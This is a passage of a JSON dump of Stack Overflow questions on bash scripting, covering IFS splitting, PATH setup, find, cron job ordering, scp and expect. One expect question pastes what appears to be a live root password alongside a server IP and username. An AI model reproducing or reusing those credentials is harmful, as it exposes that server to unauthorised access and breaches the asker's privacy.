$4\n</code></pre>\n\n<p>edit: Better yet, is there any way for my function to have access to the script arguments' variables?</p>\n\n<p>Thanks</p>\n"},{"tags":["linux","bash","scripting"],"answer_count":8,"favorite_count":3,"up_vote_count":8,"down_vote_count":0,"view_count":1952,"score":8,"question_id":511683,"title":"bash: get list of commands starting with a given string","body":"<p>Is it possible to get, using Bash, a list of commands starting with a certain string?<br />\nI would like to get what is printed hitting &lt;tab&gt; twice after typing the start of the command and, for example, store it inside a variable.</p>\n"},{"tags":["bash","error-handling","find","file-permissions"],"answer_count":6,"favorite_count":15,"up_vote_count":47,"down_vote_count":0,"view_count":21180,"score":47,"question_id":762348,"title":"How can I exclude all \"permission denied\"-messages from \"find .\"?","body":"<p>I need to hide all \"permission denied\"-messages from:</p>\n\n<pre><code>find . &gt; files_and_folders\n</code></pre>\n\n<p>I am experimenting when such message arises. I need to gather all folders and files, to which it does not arise. Is it possible to direct the permission levels to the files_and_folders-file? How can I hide the errors at the same time?</p>\n"},{"tags":["bash","bash4"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":612,"score":2,"question_id":793678,"title":"Unable to use Checkjobs and Autocd in Bash 4","body":"<p>There are new options in Bash 4: checkjobs and autocd.\nHowever, I did not find documentation for them at </p>\n\n<pre><code>man bash\n</code></pre>\n\n<p>I run unsuccessfully</p>\n\n<pre><code>{checkjobs,autocd}\n</code></pre>\n\n<p>I found the following in release notes</p>\n\n<pre><code> There is a new `checkjobs` option that causes the shell to check for and\n report any running or stopped jobs at exit\n</code></pre>\n\n<p>and</p>\n\n<pre><code>There is a new `autocd` option that, when enabled, causes bash to attempt\nto `cd` to a directory name that is supplied as the first word of a\nsimple command.\n</code></pre>\n\n<p><strong>How can you use autocd and checkjobs?</strong></p>\n"},{"tags":["bash","ifs"],"answer_count":4,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":50,"score":4,"question_id":12933132,"title":"How bash IFS is working in this example?","body":"<p>I am reading about <a href=\"http://tldp.org/LDP/abs/html/internalvariables.html\" rel=\"nofollow\">bash internal variables</a> and came across this <code>IFS</code> example:</p>\n\n<pre><code>output_args_one_per_line()\n{\n  for arg\n  do\n    echo \"[$arg]\"\n  done #  ^    ^   Embed within brackets, for your viewing pleasure.\n}\n</code></pre>\n\n<p><strong>CASE1</strong></p>\n\n<pre><code>IFS=\" \"\nvar=\" a  b c   \"\n\noutput_args_one_per_line $var\n#OUTPUT\n# [a]\n# [b]\n# [c]\n</code></pre>\n\n<p><strong>CASE2</strong></p>\n\n<pre><code>IFS=:\nvar=\":a::b:c:::\"               # Same pattern as above\nCASE2   \n                        # but substituting \":\" for \" \"  ...\noutput_args_one_per_line $var\n# []\n# [a]\n# []\n# [b]\n# [c]\n# []\n# []\n</code></pre>\n\n<p>Now, according to my understanding if value of <code>IFS</code> is default <code>\\t\\n</code> than leading and trailing whitespaces are removed. So, for case1 bash sees <code>var</code> as <code>a b c</code> therefore the output.</p>\n\n<p>For case2 according to me bash sees <code>var</code> as <code>|a||b|c|||</code> treat <code>|</code> as <code>space</code> here. I checked it using </p>\n\n<pre><code>Noob@Noob:~/tmp$ IFS=$':' FOO=$\":a::b:c:::\"; echo $FOO $'x'\n a  b c   x\n</code></pre>\n\n<p>So, my expected output for case 2 is</p>\n\n<pre><code># []\n# [a]\n# []\n# []\n# [b]\n# [c]\n# []\n# []\n# []\n</code></pre>\n\n<p>So, can someone explain to me internally how bash is treating <code>var</code> in case 2 and where am I going wrong iin my understanding.</p>\n"},{"tags":["bash","shell","inotify"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12904957,"title":"inotify with network server","body":"<p>I was thinking this was going to be rather easy, but it's turn out not to be.</p>\n\n<p>I have a mounted network server that has <code>inotifywatch</code> running on it watching a folder. I was wanting to have this set up so that anyone on the network with access to this server could drop a file into the watched folder and have it execute a script. Unfortunately it doesn't seem to trigger unless the file was moved on the server itself.</p>\n\n<p>Is there any way to make <code>inotify</code> watch a folder in a way that if any file, from anywhere, triggers the inotify event? Or should I look into something else?</p>\n\n<p>For reference, here is what I'm using in a shell script:</p>\n\n<pre><code>inotifywait -m --format '%f' -e moved_to \"/mnt/server/folder/\" |\nwhile read NAME\ndo\n     echo $NAME\ndone\n</code></pre>\n"},{"tags":["bash","shell","scripting"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":49,"score":0,"question_id":12936197,"title":"Returning a value from child shell script to a parent script","body":"<p><br/>\n    I am having two shell scripts, say script1.sh and script2.sh. I am calling script2.sh from script1.sh. In script2.sh a few evaluations are done and based the results a flag is being set. Now i need to pass the flag to script1.sh based on which it will be decided whether the script1.sh should continue it execution or exit. I am not using functions. and while i export the flag, in script1.sh it is blank. <br/> My question now is how do i return the flag from script2.sh ?<br/> Any help ? Any Ideas? Experiences to share? </p>\n"},{"tags":["bash","awk","cluster-computing"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":63,"score":1,"question_id":12935572,"title":"bash script: execute a command and pass its output to awk","body":"<p>I'm having issues with a bash script. Basically, in my script I run the command</p>\n\n<pre><code>bjobs -u $1\n</code></pre>\n\n<p>$1 is the script argument, and it's the id of a user on my cluster. If user $1 has no running/pending jobs on the cluster, bjobs prints</p>\n\n<pre><code> No unfinished jobs found\n</code></pre>\n\n<p>to stdout. Also, exit status is 255. If user $1 does have jobs, bjobs print:</p>\n\n<pre><code>JOBID   USER    STAT  QUEUE      FROM_HOST   EXEC_HOST   JOB_NAME   SUBMIT_TIME\n45823   .......\n45824   .......\n.\n.\n</code></pre>\n\n<p>and exit status is 0. I would like awk to parse the output of bjobs. I tried </p>\n\n<pre><code>bjobs -u $1 | awk '...'\n</code></pre>\n\n<p>where '...' is my awk parsing program. This doesn't work so well, because apparently when user $1 doesn't have running/pending jobs, the string \"No unfinished jobs found\" is <strong><em>not</em></strong> passed to awk. The same happens with</p>\n\n<pre><code>bjobs -u $1 &gt; foo\nawk '...' foo \n</code></pre>\n\n<p>Any suggestions?</p>\n"},{"tags":["bash","shell","unix","size"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":12935820,"title":"Total Size in a Module","body":"<p>I am trying to find the total size of the <code>libc.a</code> module using the unix <code>size</code> command.</p>\n\n<p>When running it, I get a lot of different files total sizes. What is one possible way in which I can take one column of the output of 'size' (the column <code>dec</code> in this case which has the total size of the file in decimal) and add them up?</p>\n\n<p>Is that possible to do in the command line?</p>\n"},{"tags":["bash","stdin"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":52,"score":1,"question_id":12935444,"title":"Command line arguments in bash script","body":"<p>I am trying to read command line arguments in bash but I have problems to read on the 10th column\nHere is my sample script:</p>\n\n<pre><code>#-------------------------------------------------------\n#!/bin/bash\nan=$2  mn=$4  dy=$6  der=$8  new=$10  sec=(${12} ${13})\necho $an $mn  $dy   $der  $new  $sec \n#--------------------------------------------------------\n</code></pre>\n\n<p>I have run the above script \"test.sh\" as </p>\n\n<pre><code>./test.sh -yr cat  -mn Jan  -dy  tuesday  -der tt  -new car -sec 001 001\n</code></pre>\n\n<p>The output is: </p>\n\n<pre><code>cat Jan tuesday tt -yr0 001\n</code></pre>\n\n<p>But for variable $new ($10) the answer should have been <code>car</code>  but I get <code>-yr0</code></p>\n\n<p>Any idea why ?</p>\n\n<p>yacob</p>\n"},{"tags":["bash","shell","math","awk"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":88,"score":0,"question_id":12914652,"title":"Calculating in the terminal","body":"<p>I used this in the bash terminal to get the mean in a humongous file:</p>\n\n<p><code>awk 'BEGIN{s=0;}{s=s+$2;}END{print s/NR;}' file</code></p>\n\n<p>It worked. Just out of curiosity (i.e. for future knowledge) I would like to know about common ways to calculate in the shell. R, bash, python...? Quick and dirty but still robust and fast. </p>\n"},{"tags":["html","bash","parsing","sed"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":84,"score":1,"question_id":12929316,"title":"extract integer from html according to multiple parameters with sed","body":"<p>First of all, let me say this:<br>\nI know regx'ing html is considered a bad approach, but if chuck norris can, why can't I? ;)<br>\nI want to parse this html page: <a href=\"http://pastebin.com/unAifctF\" rel=\"nofollow\">http://pastebin.com/unAifctF</a><br>\nbased on three parameters. i tried: (thank you pixellany)</p>\n\n<pre><code>sed -n  '/hebrew/{/DESPiTE/s/downloadsubtitle.php?id=/XXX/1};s/.*XXX\\([0-9]*\\).*/\\1/p'  \n</code></pre>\n\n<p>which returns 228344 instead of 228338<br>\nand i tried: (thank you doubleDown) </p>\n\n<pre><code>sed -nr 's/.*downloadsubtitle.php\\?id\\=([0-9]+).*hebrew.*DESPiTE.*/\\1/p'  \n</code></pre>\n\n<p>which returns 228343 instead of 228338\nthe expected result is 228338 because it's the first number preceded by \"downloadsubtitle.php\\?id\\=\" and followed by \"hebrew\" and \"DESPiTE\"<br>\nwhat am I missing?</p>\n"},{"tags":["linux","bash","shell","cron"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":54,"score":-1,"question_id":12913016,"title":"cronjob wait understanding","body":"<p>bellow is my cronjob script what i want to only </p>\n\n<p>wait for <strong>3rd_job</strong> completion for starting <strong>4th,5th</strong></p>\n\n<p>&amp; wait for <strong>2nd_job</strong> completion for starting <strong>6,7,8th</strong> job.</p>\n\n<p>how can i achieve this thanks in advance</p>\n\n<p>currently for starting <strong>4,5th</strong> job it is waiting for the completion of <strong>1,2,3th</strong> job but i just want to wait for <strong>3rd</strong> for starting <strong>4,5th</strong> and wait for only <strong>2nd</strong> completion for stating <strong>6,7,8th</strong></p>\n\n<pre><code>    #!/bin/bash\n    cd /home/ubuntu/\n    PATH=$PATH:/usr/local/bin\n    export PATH\n    nohup scrapy crawl 1st_job &amp;\n    nohup scrapy crawl 2nd_job &amp;\n    nohup scrapy crawl 3rd_job &amp;\n    wait $(pgrep 3rd_job)\n    nohup scrapy crawl 4th_job &amp;\n    nohup scrapy crawl 5th_job &amp;\n    wait $(pgrep 2nd_job)\n    nohup scrapy crawl 6th_job &amp;\n    nohup scrapy crawl 7th_job &amp;\n    nohup scrapy crawl 8th_job &amp;\n</code></pre>\n"},{"tags":["bash","script","terminal"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12932694,"title":"Bash Scripting, Respond to Keypress","body":"<p>I built a tiny menu to use in a bash terminal with multiple options to select via number keys. </p>\n\n<pre><code>#!/bin/bash\nPS3='Teleport to ... '\noptions=(\"→ option 1\" \"→ option 2\" \"Quit\")\nselect opt in \"${options[@]}\"\ndo\n    case $opt in\n        \"→ option 1\")\n            echo \"option 1\"\n            break\n            ;;\n        \"→ option 2\")\n            echo \"option 2\"\n            break\n            ;;\n        \"Quit\")\n            break\n            ;;\n        *) echo invalid option\n            break\n            ;;\n    esac\ndone\n</code></pre>\n\n<p>At the moment I still need to confirm the selection by pressing <em>enter</em>. Is it possible to make the script respond to the input of the first pressed key directly?</p>\n"},{"tags":["bash","printf","numeric","bc"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12861569,"title":"How do I change a couple value/error from the value+-error format to the value(error)format?","body":"<p>I have a few data text files whose lines are values with their error, like these:</p>\n\n<pre><code>...\n6  90.3785794742981 0.0952997386139722\n40 1028.46336161948 4.41798447319325\n...\n</code></pre>\n\n<p>the third column is the error relativley to the second column. I would like to write a script that prints them in a more human-readable format, that is to print the value with the right number of significant digits and to print the error on the last two digist between parenthesis, like this:</p>\n\n<pre><code>...\n6  90.379(95)\n40 1028.5(4.4)\n...\n</code></pre>\n\n<p>using regular expressions to extract the numbers wouldn't work right because of difficulties of handling the dot and because it would truncate numbers rather than approximate them, so i thought that i'd rather retrieve their magnitude with <code>printf</code> and handle them with <code>bc</code>. </p>\n\n<p>The code I wrote for this is as follows</p>\n\n<pre><code>#! /bin/bash\nwhile read a v verr\ndo\n    ov=`printf %e $v`\n    ov=${ov/*e/}\n    overr=`printf \"%e\" $verr`\n    overr=${overr/*e/}\ndov=$((1-$overr))\nv=`echo \"scale=0;$v*10^($dov)\" | bc -l`\nv=`printf %.0f $v`\nprintf \"$a %f(%.0f)\\n\" `echo \"lenght=length($v);$v*10^($((-$dov)))\" | bc -l` `echo \"$verr*10^($dov)\" | bc -l`\n done &lt; myfile.txt\n</code></pre>\n\n<p>what i get is </p>\n\n<pre><code>6 90.379000(95)\n40 1028.500000(44)\n</code></pre>\n\n<p>My code almost works, except for the appearence of those trailing zeroes.</p>\n\n<p>How do I get rid of them? Just cutting them would not be good because their number is not fixed and cutting them all would give rise to errors wheter the last digit actually is a zero.</p>\n"},{"tags":["python","perl","bash","shell","perlscript"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":85,"score":1,"question_id":12932298,"title":"shell script to find a string and print the current line and next line recursively","body":"<p>I have written a small script which searches the string and prints the current line. But m little confused to print the next line. I am ok with bash/perl/python</p>\n\n<pre><code>#!/bin/bash  \n\nCURRENT_DIR=`pwd`\ncnt=0\n\nfor dir in $(find $CURRENT_DIR -type d);\ndo\n\n\n    for myFile in $dir/*  \n    do \n\n    if [ -f \"$myFile\" ]; then\n        cat $myFile | while myLine=`line`\n        do\n     allFile=\"$myLine\"   \n        if echo \"$myLine\" | grep -q $1 ; then \n            echo \"$myFile\" \"$allFile\"   \"\"\n        fi  \n     #echo 'expr $count+1'\n     #echo   \"$allFile\"   \"\"\n        done #LINE  \n    fi\n    done #FILE\ndone # DIRECTORY\n</code></pre>\n"},{"tags":["bash","shell","path","command-path"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":118,"score":2,"question_id":9455315,"title":"directory specific PATH variable","body":"<p>I want to change my PATH variable depending on the current directory.</p>\n\n<p>For a project I'm using a set of scripts that I would like to run without specifying the full path to the script. Normally I would do that by adding the \"Scripts\" directory to the PATH variable.</p>\n\n<p>The thing is, for my other projects I don't want to have these Scripts in my PATH. Is there a way to change the PATH variable according to the current directory? If so I'd be happy to learn how.</p>\n"},{"tags":["osx","bash","path","command-path"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":2744,"score":2,"question_id":2314002,"title":"Adding mysql to my .bashrc PATH","body":"<p>Ok, maybe I'm doing something really stupid.</p>\n\n<p>I'm on OSX 10.6.1.</p>\n\n<p>I want to add mysql to my path, so I add the following to my .bashrc</p>\n\n<pre><code>PATH = ${PATH}:/usr/local/mysql/bin\nexport PATH\n</code></pre>\n\n<p>upon running terminal, it doesn't work, which I expect, because .bash_profile is not loading .bashrc at the moment.</p>\n\n<p>but if I manually enter bash, i get the following error</p>\n\n<pre><code>bash: PATH: command not found\n</code></pre>\n\n<p>What am I doing wrong?</p>\n"},{"tags":["linux","bash","path","command-path"],"answer_count":6,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":276,"score":1,"question_id":2831910,"title":"Is there a reasonable way to attach new path to PATH in bashrc?","body":"<p>Guys\nI constantly need to attach new paths to the PATH environment variable in .bashrc, like below:\nexport PATH=/usr/local/bin:$PATH\nThen to make it take effect, I always do 'source ~/.bashrc' or '. ~/.bashrc', while I found one shortcoming of doing so which make me uncomfortable.</p>\n\n<p>If I keep doing so, the PATH will getting longer and longer with many duplicated entries, for example in the previous command, if I source it twice, the value of PATH will be \nPATH=/usr/local/bin:/usr/local/bin:/usr/local/bin:$PATH(&lt;-the original path).</p>\n\n<p>Is there a more decent way to attach new path to PATH in bashrc without making it ugly?</p>\n"},{"tags":["bash","shell","terminal","environment-variables","command-path"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":657,"score":3,"question_id":1416024,"title":"Bash - $PATH and ${PATH}","body":"<p>What is the difference between using an environment variable, like PATH, as $PATH or ${PATH}?</p>\n"},{"tags":["bash","path","command-path"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":136,"score":1,"question_id":6253169,"title":"Automatic changes to $PATH in Bash","body":"<p>The project I work on has some executable scripts in the repository. These scripts are actually tools that automate some development tasks and I invoke them only when I'm inside the repo and they work only on files in the repo. My typical working session looks like this:</p>\n\n<pre><code>$ cd $REPO\n$ ./tools/start-session\n$ some-script some arguments\n$ other-script other arguments\n</code></pre>\n\n<p>In other words, the <code>start-session</code> script just adds an appropriate entry to the <code>$PATH</code> variable.</p>\n\n<p>I'd like to automate it further so that I don't have to call the <code>$REPO/tools/start-session</code> script. What I'd like to achieve is to make bash automatically detect that I'm in my repo dir and append proper entry to <code>$PATH</code>. The point is that I have many working copies of my repo and the tools differ a bit in each branch, I move between working copies frequently and I'd like my shell to kind of guess which script I want to invoke.</p>\n\n<p>How do I do that?</p>\n\n<p>The only thing I can think of is that the <code>$PS1</code> variable gets executed each time a command is completed, so I could somehow hook some <code>$PATH</code>-changing script in there using backticks, i.e. do some thing like</p>\n\n<pre><code>PS1=`update-path`$PS1\n</code></pre>\n\n<p>But this seems not the right way.</p>\n"},{"tags":["bash","path","command-path"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":134,"score":0,"question_id":7529575,"title":"Bash: how to add subdirs to the PATH","body":"<p>In <code>.bashrc</code> I have added a dir where I put some scripts. Is that possible - to add all its subdir automatically - so that I would not have to add them one-by-one manually? (and wouldn't have to visit <code>.bashrc</code> every time I'll make a dir there)</p>\n\n<p><strong>Edit</strong>:</p>\n\n<p>Using Laurent Legrand's solution, that's what I'm using now:</p>\n\n<pre><code>PATH=$PATH:/usr/local/share/NAMD_2.7_Linux-x86_64:/usr/local/share/jmol-12.0.31:/usr/local/share/NAMD_2.7_Linux-x86_64_orig:/usr/local/share/sage-4.6.2:/opt/mongoDB/bin\n\nPATH=$PATH:$(find ~/Study/geek/scripts -type d -printf \"%p:\")\n</code></pre>\n\n<p>this adds the dir and its sub dirs.</p>\n"},{"tags":["bash","path","command-path"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":124,"score":0,"question_id":7807062,"title":"$PATH is not working","body":"<p>The following file worked yesterday, but today it isn't working any more.</p>\n\n<p>Could be caused by either the <code>apt-get upgrade</code> or <code>autoremove</code> that I performed.</p>\n\n<p>For some reason $PATH isn't working, I have no idea why not.</p>\n\n<pre><code>$ cat GW\n#!/bin/bash\nPATH=\"/media/Data/Wine/WineVersions/1.3.24/bin:$PATH\"\nexport WINEPREFIX=\"/media/Data/Wine/WinePrefixes/GW\"\nexport WINEDEBUG=\"-all\"\ncd \"/media/Data/Wine/WinePrefixes/GW/drive_c/Program Files/Guild Wars\"\nwine Gw.exe\n\n$ ./GW\n./GW: line 6: /media/Data/Wine/WineVersions/1.3.24/bin/wine: No such\nfile or directory\n\n$ ls /media/Data/Wine/WineVersions/1.3.24/bin/wine\n/media/Data/Wine/WineVersions/1.3.24/bin/wine\n</code></pre>\n\n<p>I also tried <code>export PATH=\"blablabla\"</code> but that didn't work either.</p>\n\n<p>Edit: Requested info</p>\n\n<pre><code>$ file /media/Data/Wine/WinePrefixes/GW/drive_c/Program\\ Files/Guild\\ Wars/Gw.exe\n/media/Data/Wine/WinePrefixes/GW/drive_c/Program Files/Guild Wars/Gw.exe: PE32 executable for MS Windows (GUI) Intel 80386 32-bit\n\n# Not a symlink\n$ ls -l /media/Data/Wine/WineVersions/1.3.24/bin/wine gives -rwxr-xr-x 1 j j 7244\n2011-08-11 17:18 /media/Data/Wine/WineVersions/1.3.24/bin/wine\n</code></pre>\n"},{"tags":["bash","node.js","amazon-ec2","sudo","command-path"],"answer_count":7,"favorite_count":8,"up_vote_count":15,"down_vote_count":0,"view_count":4802,"score":15,"question_id":4976658,"title":"On EC2: sudo node command not found, but node without sudo is ok","body":"<p>I have just installed nodejs on a new EC2 micro instance.</p>\n\n<p>I installed it normally, ./configure -> make -> sudo make install.</p>\n\n<p><strong>Problem:</strong> When I run \"node\" under ec2-user, it runs perfectly. When I run \"sudo node\", it fails.</p>\n\n<p>I found out that node is in:</p>\n\n<pre><code>[ec2-user@XXXX ~]$ whereis node\nnode: /usr/local/bin/node /usr/local/lib/node\n</code></pre>\n\n<p>and the current path is</p>\n\n<pre><code>[ec2-user@XXXX ~]$ echo $PATH\n/usr/local/bin:/bin:/usr/bin:/opt/aws/bin:/home/ec2-user/bin\n</code></pre>\n\n<p>but, the sudo path is</p>\n\n<pre><code>[root@ip-10-112-222-32 ~]# echo $PATH\n/usr/local/sbin:/sbin:/bin:/usr/sbin:/usr/bin:/opt/aws/bin:/root/bin\n</code></pre>\n\n<p>then I tried to edit the root PATH to include the paths to node, so \"node\" runs when I'm logged in as root - but it still won't work when I log in as ec2-user and run \"sudo node\".</p>\n\n<p>I need this to install npm properfly. Any idea on how to include the node path while running \"sudo node\"?</p>\n"},{"tags":["bash","file","copy","directories"],"answer_count":5,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":3048,"score":3,"question_id":3643848,"title":"Copy files from one directory into an existing directory","body":"<p>In bash I need to do this:</p>\n\n<ol>\n<li><p>take all files in a directory </p></li>\n<li><p>copy them into an existing directory</p></li>\n</ol>\n\n<p>How do I do this? I tried cp -r t1 t2 (both t1 and t2 are existing directories, t1 has files in it) but it created a directory called t1 inside t2, I don't want that, I need the files in t1 to go directly inside t2. How do I do this?</p>\n"},{"tags":["python","image","bash","animated-gif"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":97,"score":0,"question_id":12923775,"title":"bash evenly choose 10 numbers","body":"<p>In my current problem, I have several hundred animated gifs that will preform a certain animation a few times and then do a different animation the last time. So that means the gif loops 3 times or so then on the 4th time instead of looping it will do a different animation. These loops are all just hardcoded into layers in the .gif file.   </p>\n\n<p>My goal is to determine the first loop and shrink the animation into ten frames. I figure that using python, I can find when the first frame equals a later frame (thereby finding the first full sequence and the number of frames). Now I have the number of frames that the animation takes, and this number is variable across the several hundred different images I'm working with. So for one image, the first loop will complete in 20 or so frames, another maybe in 25. Some will take 75 or so frames (since they are a very slow image)    </p>\n\n<p>My question is using these numbers (20, 25, 75, ... or whatever the first loop is) how can I best turn this into only 10. In my head I did a little math, and these is a good example of what I need to figure out how to generate</p>\n\n<pre><code>20 -&gt; 20/10 = 2 Resulting sequence: [0, 20) step 2\n25 -&gt; 25/10 = 2.5 Sequenece: [0, 25).... Step ?? should alternate between 2 and 3 somehow\n75 -&gt; 75/10 = 7.5 Sequenece: [0, 75).... Step ?? should alternate between 7 and 8 somehow\n</code></pre>\n\n<p>My solution could either be in bash script or python or whatever you can use from the bash shell.</p>\n"},{"tags":["bash"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":12929688,"title":"Autologin server using client application","body":"<p>I am learning bash programming. However, I am facing little problem. I want to write a script that auto logins, Cyberoam (that is, at web server 172.16.1.3) using Cyberoam client. So that I don't have to ever login on the webpage. I could write a simple script that does this, and schedule to run at startup. But I want more advanced script that scans the network and login. I also don't want to use more resources on my computer.  </p>\n\n<p>I tried this way:    </p>\n\n<pre><code>#!/bin/bash\n\nfunction CheckServer \n{\n    SLEEPTIME=300\n    while true; do\n        ping -c 1 173.16.1.3 &gt; /dev/null\n        if [ $? -ne 0 ]; then\n            Login;\n        fi\n\n        sleep $SLEEPTIME\n    done\n}\n\nfunction Login\n{\n    usrname=u10co067\n    cd ~/bin\n    if  test -f crclient; then\n        ./crclient -u $usrname\n    else\n        echo \"Cyberoam Client Missing\"\n    fi\n}\n</code></pre>\n\n<p>Do any of you guys have any better idea on how can I do this task?</p>\n"},{"tags":["linux","bash","shell","rsync"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":49,"score":1,"question_id":12929391,"title":"Restrict shell commands","body":"<p>I create a username with bash shell , normal shell that's available all commands , but i intend to use this shell for backup service , which is allow only rsync command , so i am trying to restrict this shell to execute rsync commands only , how could i do with .bash_profile and bashrc ?</p>\n\n<p>Addtional Information : this shell used for backup files and folder only and i connect other shell to rsync using .ssh key</p>\n"},{"tags":["ios","xcode","bash","unix","build"],"answer_count":1,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":77,"score":4,"question_id":12927255,"title":"Xcode Build Script (Build Phases->Run Script) Increment Build Version based on Username(User)","body":"<p>When compiling a project, this script should increment the Build Version of the Xcode project by one, when the system username matches. Keep in mind that these are just Unix commands in a script (not Applescript, Python, or Perl) inside Target->Build Phases->Run Script in Xcode.</p>\n\n<p>I've done \"echo $USER\" in terminal. This prints the username of the logged-in user just fine, and it's the same string I placed in the conditional statement in the second block of code.</p>\n\n<p>The first block of code works. The second, which adds the conditional statement, does not.</p>\n\n<pre><code>#!/bin/bash\nbuildNumber=$(/usr/libexec/PlistBuddy -c \"Print CFBundleVersion\" \"$INFOPLIST_FILE\")\nbuildNumber=$(($buildNumber + 1))\n/usr/libexec/PlistBuddy -c \"Set :CFBundleVersion $buildNumber\" \"$INFOPLIST_FILE\"\n</code></pre>\n\n<p><br> </p>\n\n<pre><code>#!/bin/bash\nusername=$USER\nif [ username == \"erik\" ]; then\nbuildNumber=$(/usr/libexec/PlistBuddy -c \"Print CFBundleVersion\" \"$INFOPLIST_FILE\")\nbuildNumber=$(($buildNumber + 1))\n/usr/libexec/PlistBuddy -c \"Set :CFBundleVersion $buildNumber\" \"$INFOPLIST_FILE\"\nfi\n</code></pre>\n\n<p><b>Syntax concerns:</b>\n  <br>Parsing of $USER (case sensitive) \n  <br>Semicolon right after closing bracket in if statement\n  <br>Then statement on same line as if statement   </p>\n"},{"tags":["bash","find","spaces","sunos"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12928857,"title":"Ignore spaces in Solaris 'find' output","body":"<p>I am trying to remove all empty files that are older than 2 days. Also I am ignoring hidden files, starting with dot. I am doing it with this code:</p>\n\n<pre><code>find /u01/ -type f -size 0 -print -mtime +2 | grep -v \"/\\\\.\" | xargs rm\n</code></pre>\n\n<p>It works fine until there are spaces in the name of the file. How could I make my code ignore them?</p>\n\n<p>OS is Solaris.</p>\n"},{"tags":["linux","bash","printing","skip"],"answer_count":7,"favorite_count":11,"up_vote_count":42,"down_vote_count":0,"view_count":20217,"score":42,"question_id":604864,"title":"Print a file skipping X lines in Bash","body":"<p>I have a very long file which I want to print but skipping the first 1e6 lines for example. I look into the cat man page but I did not see nay option to do this. I am looking for a command to do this or a simple bash program. I know how to do it using a program in C but I want to do it using the common commands. Any way to do it? Thanks a lot in advance.. </p>\n"},{"tags":["linux","bash","scp"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":2,"view_count":83,"score":-1,"question_id":12920947,"title":"Does scp create the target folder if it does not exist","body":"<p>I am wondering if scp will create the target folder if it does not exist on the remote server. For example, would this work? </p>\n\n<pre><code>scp -r /data/install/somefolder user@ftpserver.com:/data/install/somefolder\n</code></pre>\n\n<p>Here the folder <code>/data/install/somefolder</code> doesn't exist on ftp server, so would this command create it?</p>\n\n<p>N.B. I have read about rsync but am not really sure how it works or how to use it yet.</p>\n"},{"tags":["arrays","bash"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":97,"score":3,"question_id":12925005,"title":"read array with spaces","body":"<p>Say I have the file <code>foo.txt</code></p>\n\n<pre><code>\"The\" \"quick brown\" \"fox\" \"jumps over\" \"the\" \"lazy dog.\"\n</code></pre>\n\n<p>I would like to read these \"fields\" from the file into an array. However my attempt is failing if the field has a space</p>\n\n<pre><code>$ read -a bar &lt; foo.txt\n\n$ echo ${bar[0]}\n\"The\"\n\n$ echo ${bar[1]}\n\"quick\n</code></pre>\n"},{"tags":["bash","expect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":68,"score":0,"question_id":12925986,"title":"expect in bash script with special characters 2 parts","body":"<p>So I am trying to get expect within bash to work correctly.</p>\n\n<p>Here is the script contents...</p>\n\n<pre><code>[root@mysql1 ~]# cat mysql_repl.sh\n#!/bin/bash\nread -p \"Master server ip: \" masterip\nread -p \"What is the regular user to log into the master server: \" masteruser\nread -p \"What is the password for the regular user for the master server: \" masterpass\nread -p \"What is the root password for the master server: \" masterrootpass\n\nread -p \"Slave server ip: \" slaveip\nread -p \"What is the regular user to log into the slave server: \" slaveuser\nread -p \"What is the password for the regular user for the slave server: \" slavepass\nread -p \"What is the root password for the slave server: \" slaverootpass\n\n\n\nexpect -c \"set slaveip $slaveip;\\\nset slaveuser $slaveuser;\\\nset slavepass $slavepass;\\\nset timeout -1;\\\nspawn /usr/bin/ssh $slaveip -l $slaveuser 'ls -lart';\\\nmatch_max 100000;\nexpect *password:;\\\nsend -- $slavepass\\r;\\\ninteract;\"\n</code></pre>\n\n<p>Here is the output of the script...</p>\n\n<pre><code>[root@mysql1 ~]# ./mysql_repl.sh\nMaster server ip:\nWhat is the regular user to log into the master server:\nWhat is the password for the regular user for the master server:\nWhat is the root password for the master server:\nSlave server ip: xxx.xxx.xxx.xxx\nWhat is the regular user to log into the slave server: rack\nWhat is the password for the regular user for the slave server: test\nWhat is the root password for the slave server: DVJrPey99grJ\nspawn /usr/bin/ssh 198.61.221.179 -l rack 'ls -lart'\nrack@198.61.221.179's password:\nbash: ls -lart: command not found\n</code></pre>\n\n<p>The command is not executing correctly. I also tried /bin/ls and it still can not find it.</p>\n\n<p>Second Part... same script...</p>\n\n<p>I have a variable in bash,  specifically, a password.  In this case the password is \"as$5!@?\"\nWhat I want to do is 